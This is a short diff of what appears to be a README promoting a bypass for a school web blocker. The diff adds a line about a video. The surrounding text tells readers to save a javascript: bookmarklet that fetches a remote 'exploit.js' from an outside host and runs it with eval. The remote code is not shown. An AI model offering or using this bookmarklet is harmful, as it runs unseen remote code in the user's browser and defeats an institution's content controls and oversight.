@@ -4,6 +4,7 @@ do YOU want to bypass your school blocker?
 heres how!
 (might not work with some computers because of updates and stuff)
 
+(video coming soon!)
 
 Copy this code and put it in a bookmark. Code: javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
 
